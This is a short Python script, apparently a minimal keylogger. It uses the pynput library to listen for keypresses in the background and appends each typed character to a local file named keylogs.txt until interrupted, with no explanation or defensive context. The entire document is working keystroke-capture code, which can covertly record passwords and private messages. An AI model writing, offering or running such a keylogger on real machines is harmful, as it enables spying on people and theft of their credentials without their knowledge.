from pynput import keyboard
import os

def on_press(key):
    try:
        with open("keylogs.txt", "a") as f:
            f.write(str(key.char))
    except Exception:
        pass

listener = keyboard.Listener(on_press=on_press)
listener.start()

try:
    while True:
        pass
except KeyboardInterrupt:
    listener.stop()